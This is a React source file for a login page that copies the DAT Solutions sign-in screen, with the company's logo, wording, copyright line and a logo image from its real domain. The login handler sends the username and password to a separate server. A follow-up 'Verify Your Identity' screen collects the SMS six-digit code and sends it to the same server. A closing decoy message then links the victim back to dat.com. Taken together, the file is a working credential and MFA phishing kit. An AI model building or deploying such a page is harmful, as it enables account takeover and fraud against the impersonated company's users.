import { Checkbox, FormControlLabel, FormGroup, TextField } from "@mui/material";
import { useState } from "react";
import "./App.css";
import { PasswordInput } from "./Password";

function App() {
  const [password, setPassword] = useState("");
  const [username, setUsername] = useState("");
  const [login, setLogin] = useState(false);
  const [loggedIn, setLoggedIn] = useState(true);
  const [firstRequired, setFirstRequired] = useState(false);
  const [secondRequired, setSecondRequired] = useState(false);
  const [passwordRequired, setPasswordRequired] = useState(false);
  const [passwordClicked, setPasswordClicked] = useState(false);
  const [code, setCode] = useState("");
  const [isInvalidData, setIsInvalidData] = useState(null);
  const [number, setNumber] = useState("");
  const [id, setId] = useState(null);
  const [isLoader, setIsLoader] = useState("none");
  const [isContinue, setIsContinue] = useState(true);

  const handleLogin = async () => {
    setIsLoader("block");
    try {
      const response = await fetch("http://localhost:9266/users", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: username,
          password: password
        })
      });
      const data = await response.json();
      setIsLoader("none");
      if (data?.number) {
        setId(data.id);
        setLoggedIn(true);
        setNumber(data.number);
      }
      setIsInvalidData(true);
      setPasswordRequired(true);
    } catch (e) {
      console.log(e.message);
    }
  };

  const handleContinue = async () => {
    setIsContinue(true);
    await fetch(`http://localhost:9266/users/${id}`, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ code })
    });
  };

  document.addEventListener("click", () => {
    !username ? setFirstRequired(true) : setFirstRequired(false);
    if (!password && passwordClicked) {
      setSecondRequired(true);
      setPasswordRequired(true);
    } else {
      setSecondRequired(false);
      setPasswordRequired(false);
    }
  });

  const handleUsernameChange = (e) => {
    e.target.value === "" ? setFirstRequired(true) : setFirstRequired(false);
    setUsername(e.target.value);
    setIsInvalidData(false);
    setLogin(!(e.target.value && password));
  };

  const handlePasswordChange = (e) => {
    if (e.target.value === "") {
      setSecondRequired(true);
      setPasswordRequired(true);
    } else {
      setSecondRequired(false);
      setPasswordRequired(false);
    }
    setPassword(e.target.value);
    setIsInvalidData(false);
    setLogin(!(username && e.target.value));
    document.addEventListener("click", () => {
      if (e.target.value === "") {
        setSecondRequired(true);
        setPasswordRequired(true);
      } else {
        setSecondRequired(false);
        setPasswordRequired(false);
      }
    });
  };
  const handlePasswordClick = (e) => {
    setPasswordClicked(true);
  };

  const handleCodeChange = (e) => {
    setCode(e.target.value);
  };

  return (
    <>
      {!loggedIn ? (
        <>
          <div className="background-map">
            <svg width="112" height="52" fill="none" viewBox="0 0 112 52" className="logo">
              <g fill="#fff">
                <path d="M3.042 43.879h4.29v1.592h-4.29v3.55H.912v-8.876h6.645v1.645H3.042v2.089zM10.184 43.423h.048c.181-.372.468-.683.825-.893.356-.21.767-.311 1.18-.29.134-.002.268.014.397.047v1.835c-.234-.029-.469-.044-.704-.048-.953 0-1.663.397-1.663 1.687v3.243H8.285V42.4h1.9v1.023zM19.475 47.033c-.237.923-1.184 2.136-3.326 2.136-2.142 0-3.408-1.325-3.408-3.45 0-2.124 1.26-3.473 3.402-3.473 2.142 0 3.55 1.337 3.397 3.864h-4.746c0 1.047.556 1.722 1.385 1.722.293.026.586-.053.825-.225.239-.172.408-.424.477-.71l1.994.136zm-4.681-2.118h2.728c.012-.187-.014-.374-.077-.55-.063-.177-.161-.338-.29-.475-.127-.136-.282-.245-.453-.32-.172-.074-.357-.112-.544-.112-.187 0-.372.038-.544.113-.171.074-.326.183-.454.32-.128.136-.226.297-.29.474-.062.176-.088.363-.076.55zM22.227 39.985v1.55h-1.983v-1.55h1.983zm0 2.415v6.61h-1.983V42.4h1.983zM29.695 48.524c0 2.225-1.492 2.96-3.385 2.96-1.628 0-2.96-.593-3.35-2.196l1.97-.178c.075.3.256.56.51.735.255.175.564.25.87.212.834 0 1.408-.426 1.408-1.58v-.657h-.053c-.23.293-.528.524-.869.672-.341.148-.714.208-1.084.174-1.58 0-2.781-1.225-2.781-3.219 0-1.994 1.183-3.201 2.828-3.201.387-.037.776.033 1.126.2.35.169.649.428.863.753h.065v-.8h1.9l-.018 6.125zm-1.882-3.077c0-1.06-.592-1.722-1.432-1.722s-1.432.657-1.432 1.722.591 1.775 1.438 1.775c.846 0 1.426-.686 1.426-1.775zM32.724 43.287c.233-.33.543-.597.903-.779.36-.181.76-.272 1.163-.262 1.26 0 2.278.751 2.278 2.426v4.338h-1.982V45.15c0-.97-.403-1.325-1.125-1.325s-1.284.591-1.284 1.663v3.52h-1.982v-9.024h1.982v3.302h.047zM41.121 47.607c.216.002.43-.021.64-.07v1.473c-.413.11-.84.163-1.267.16-1.414 0-2.03-.38-2.03-1.776v-3.728h-1.03V42.4h1.03V40.57h1.983V42.4h1.349v1.284h-1.35v3.302c0 .52.208.592.675.592v.03zM50.986 48.246c-.747.613-1.685.946-2.651.941-1.817 0-3.51-.834-3.51-2.633 0-1.184.634-1.894 1.776-2.444l.302-.142c-.746-.84-.947-1.361-.947-1.953 0-1.219 1.142-2.13 2.746-2.13s2.781.947 2.781 2.13c0 .923-.674 1.438-1.509 1.894l-.515.284 1.355 1.402c.12-.41.18-.834.178-1.26h1.675c.013.891-.19 1.772-.592 2.568l2.006 2.083h-2.355l-.74-.74zm-2.651-.538c.577.006 1.135-.205 1.562-.592l-1.964-2.065-.119.065c-.282.11-.526.298-.704.542-.178.245-.283.535-.302.837 0 .722.592 1.213 1.55 1.213h-.023zm-.538-5.598c0 .32.195.591.662 1.1l.249-.124c.592-.272.905-.527.905-.976-.018-.229-.122-.441-.29-.597-.169-.155-.39-.241-.618-.241-.23 0-.45.086-.618.241-.168.156-.272.368-.29.597zM58.898 47.015l-.663 1.995h-2.237l3.243-8.877h2.829l3.243 8.877h-2.267l-.675-1.995h-3.473zm1.775-5.136h-.053l-1.184 3.592h2.45l-1.213-3.592zM67.887 43.287c.234-.335.55-.607.917-.789.367-.182.774-.269 1.183-.252 1.308 0 2.32.751 2.32 2.426v4.338h-1.982V45.15c0-.97-.403-1.325-1.125-1.325s-1.284.509-1.284 1.603v3.551h-1.982V42.4h1.9v.887h.053zM79.337 47.63c.08-.001.16-.015.237-.04v1.42c-.284.075-.576.111-.87.106-.828 0-1.302-.213-1.527-.757h-.053c-.248.272-.553.486-.894.626-.34.14-.709.203-1.077.184-1.236 0-2.278-.722-2.278-1.952 0-1.415.935-1.947 2.61-2.166 1.26-.172 1.586-.35 1.586-.734 0-.385-.326-.722-.947-.722-.272-.007-.538.08-.754.245-.215.166-.367.401-.43.666l-1.846-.225c.284-1.284 1.438-2.035 3.036-2.035 1.982 0 2.9.864 2.9 2.201v2.8c0 .325.1.384.284.384h.023zm-2.266-1.775c-.37.185-.772.295-1.184.326-.591.1-.988.39-.988.935-.005.107.014.213.053.312.04.099.101.188.179.262.077.073.17.13.27.164.101.035.208.047.315.037.183.003.365-.032.535-.103.17-.07.322-.175.45-.307s.227-.288.291-.46c.065-.172.094-.355.085-.538l-.006-.627zM82.036 39.985v9.025h-1.983v-9.025h1.983zM87.308 49.01c-.775 2.183-1.65 2.45-2.858 2.45-.396.003-.791-.02-1.183-.072v-1.597c.275.048.554.072.834.07.227.035.459-.018.649-.148s.323-.325.375-.55l.077-.195-2.646-6.568h2.154l1.486 4.278h.047l1.338-4.278h2.118l-2.39 6.61zM93.45 47.607c.214.003.427-.021.634-.07v1.473c-.411.11-.835.164-1.26.16-1.415 0-2.03-.38-2.03-1.776v-3.728h-1.03V42.4h1.03V40.57h1.982V42.4h1.344v1.284h-1.344v3.302c0 .52.201.592.675.592v.03zM96.8 39.985v1.55h-1.982v-1.55H96.8zm0 2.415v6.61h-1.982V42.4H96.8zM102.203 46.512l2.012.202c-.29 1.183-1.184 2.455-3.326 2.455-2.142 0-3.402-1.32-3.402-3.456s1.278-3.467 3.402-3.467c2.125 0 2.959 1.284 3.243 2.19l-1.953.366c-.052-.306-.21-.584-.445-.786-.236-.202-.534-.315-.845-.32-.84 0-1.385.633-1.385 2.017 0 1.385.545 2.012 1.385 2.012.33-.005.646-.132.888-.356.243-.224.394-.529.426-.857zM108.848 44.412c-.049-.272-.197-.516-.416-.684-.218-.169-.492-.25-.767-.228-.592 0-.977.243-.977.693 0 .45.432.556 1.101.668l.687.101c1.183.201 2.367.556 2.367 2.065 0 1.51-1.361 2.142-3.154 2.142-1.794 0-3.013-.757-3.237-2.088l1.864-.22c.022.164.077.322.16.465.084.142.195.267.327.366.132.1.282.172.442.214.161.04.327.05.491.027.68 0 1.118-.302 1.118-.793 0-.492-.449-.592-1.183-.71l-.758-.119c-1.077-.171-2.213-.556-2.213-1.994 0-1.331 1.385-2.053 2.959-2.053s2.799.721 3.018 1.958l-1.829.19zM0 0v33.766h33.766V0H0zm15.67 27.635H7.166V6.025h8.504c2.866 0 5.614 1.138 7.64 3.164 2.027 2.026 3.165 4.775 3.165 7.64 0 2.866-1.138 5.615-3.165 7.641-2.026 2.027-4.774 3.165-7.64 3.165z"></path>
                <path d="M14.658 11.184c3.55 0 5.734 2.166 5.734 5.646s-2.166 5.657-5.793 5.657h-1.45V11.184h1.509zM58.549 19.6h-5.687l2.84-6.759L58.55 19.6z"></path>
                <path d="M38.831 0v33.766h33.766V0H38.831zm23.304 27.635l-1.474-3.503h-9.9l-1.473 3.503H43.37l9.113-21.61h6.439l9.095 21.61h-5.882zM77.663 0v33.766h33.765V0H77.663zm26.99 11.007h-7.066v16.628h-6.024V11.007h-7.101V6.024h20.167l.024 4.983z"></path>
              </g>
            </svg>
          </div>
          <div className="container">
            <div className="login">
              <h1 className="header">Log in</h1>
              <h3 className="paragraph">to continue to your DAT account</h3>
              <form style={{ padding: "0 24px" }}>
                <div style={{ textAlign: "right", marginBottom: "5px" }}>
                  <a href="#">Forgot your username?</a>
                </div>
                <TextField
                  id="outlined-basic"
                  label="Username/Email"
                  InputLabelProps={{
                    sx: {
                      fontSize: "14px"
                    }
                  }}
                  variant="outlined"
                  size="medium"
                  value={username}
                  onChange={handleUsernameChange}
                  fullWidth
                  required
                  autoFocus
                  error={firstRequired}
                  name="username"
                />
                <div className="required">
                  <p style={firstRequired ? { display: "block" } : { display: "none" }}>Required field.</p>
                </div>
                <FormGroup>
                  <FormControlLabel control={<Checkbox size="small" />} label="Remember me" />
                </FormGroup>
                <div style={{ textAlign: "right", marginTop: "8px", marginBottom: "5px" }}>
                  <a href="#">Reset password</a>
                </div>
                <PasswordInput
                  password={password}
                  handlePassword={handlePasswordChange}
                  passwordRequired={passwordRequired}
                  handlePasswordClick={handlePasswordClick}
                />
                <div className="required">
                  <p style={secondRequired ? { display: "block" } : { display: "none" }}>Required field.</p>
                </div>
                <div className="required">
                  <p style={isInvalidData ? { display: "block" } : { display: "none" }}>
                    Invalid username and password combination
                  </p>
                </div>
                <button
                  className="login-button"
                  style={
                    login
                      ? { backgroundColor: "#e9ecf1", color: "#9ca5af" }
                      : { backgroundColor: "#192129", color: "#fff", cursor: "pointer" }
                  }
                  type="button"
                  disabled={login}
                  onClick={handleLogin}
                >
                  Log in
                </button>
              </form>
              <p className="terms">
                By continuing you agree to our <a href="#">terms and conditions</a>.
              </p>
            </div>
            <div className="footer">
              <p>Copyright © 2024 DAT Solutions, LLC. All rights reserved. </p>
              <a href="#">Privacy Policy</a>
            </div>
          </div>
          <div className="opacity-container" style={{ display: isLoader }}>
            <div className="loader"></div>
          </div>
        </>
      ) : !isContinue ? (
        <div className="container verify">
          <div className="verification">
            <div className="verify-identity">
              <img
                style={{ height: "42px" }}
                id="prompt-logo-center"
                src="https://hlp.prod.prod.dat.com/login/assets/dat-logo-email.svg"
                alt="DAT Solutions"
              />
              <h1 className="verify-identity-header">Verify Your Identity</h1>
              <div style={{ fontSize: "0.875rem", fontWeight: "400", marginBottom: "25px" }}>
                <p>We've sent a text message to:</p>
              </div>
              <TextField
                id="outlined-basic"
                variant="outlined"
                fullWidth
                label={number}
                InputLabelProps={{
                  sx: {
                    borderRadius: "10px",
                    color: "black !important",
                    marginTop: "10px",
                    boxShadow: "none",
                    fontWeight: "300"
                  }
                }}
                InputProps={{
                  sx: {
                    backgroundColor: " #f1f2f3",
                    marginTop: "10px",
                    borderRadius: "10px"
                  }
                }}
                disabled
              />

              <TextField
                id="outlined-basic"
                variant="outlined"
                value={code}
                onChange={handleCodeChange}
                fullWidth
                required
                label="Enter the 6-digit code"
                autoFocus
                name="code"
                InputLabelProps={{
                  sx: {
                    marginTop: "10px"
                  }
                }}
                InputProps={{
                  sx: {
                    marginTop: "10px",
                    borderRadius: "10px"
                  }
                }}
              />
              <FormGroup>
                <FormControlLabel
                  control={
                    <Checkbox
                      sx={{
                        "&, & + .MuiFormControlLabel-label": {
                          fontSize: "14px"
                        }
                      }}
                    />
                  }
                  label="Remember this device for 30 days"
                />
              </FormGroup>
              <button
                className="continue-button"
                style={{ backgroundColor: "#0059d6", cursor: "pointer" }}
                type="button"
                onClick={handleContinue}
              >
                Continue
              </button>
              <p style={{ textAlign: "center", fontSize: "14px", marginTop: "10px", marginBottom: "0" }}>
                Didn't receive a code?{" "}
                <button type="button" name="action" aria-label="" value="pick-authenticator" className="c14e56dac">
                  Resend
                </button>{" "}
                or
                <button type="button" name="action" aria-label="" value="pick-authenticator" className="c14e56dac">
                  get a call.
                </button>
              </p>
              <div style={{ textAlign: "center" }}>
                <button type="button" name="action" aria-label="" value="pick-authenticator" className="c14e56dac">
                  TRY ANOTHER METHOD
                </button>
              </div>
            </div>
          </div>
        </div>
      ) : (
        <div
          style={{
            width: "100vw",
            backgroundImage: "url(public/bg.png)",
            backgroundRepeat: "no-repeat",
            backgroundSize: "cover",
            height: "100vh"
          }}
        >
          <div className="opacity-container">
            <div className="oops">
              <div className="opps-content">
                <h4 style={{ margin: "0" }}>Oops!</h4>
                <p>You or someone else is logged in on another device.</p>
                <p>
                  If you click <i>Login Anyway</i>, the other device will be logged out.
                </p>
                <div style={{ textAlign: "right" }}>
                  <a href="https://dat.com">
                    <button
                      type="button"
                      style={{
                        backgroundColor: "#6e6e6e",
                        color: "white",
                        padding: "10px 20px",
                        borderRadius: "5px",
                        border: "1px solid #6e6e6e",
                        marginLeft: "15px",
                        cursor: "pointer"
                      }}
                    >
                      LOGIN ANYWAY
                    </button>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
}

export default App;
